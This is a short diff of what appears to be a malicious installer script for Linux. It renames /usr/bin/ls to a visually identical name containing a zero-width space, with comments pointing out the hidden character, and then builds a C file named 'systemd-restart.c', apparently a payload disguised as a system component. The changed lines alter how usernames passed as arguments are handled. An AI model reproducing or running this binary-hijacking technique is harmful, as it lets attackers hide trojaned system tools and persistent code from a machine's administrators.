@@ -3,10 +3,14 @@ if [ $# -eq 0 ]; then
     echo "No arguments supplied; assuming first time"
 	mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
 else
-	if [ $1 != "--reinstall" ]; then
-		mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
-	fi
+	i=1;
+	for user in "$@" 
+	do
+    	echo "Username - $i: $user";
+    	i=$((i + 1));
+	done
 fi
+return
 #Build executables
 #NOTE: This requires the packages golang and gcc to be installed
 gcc systemd-restart.c
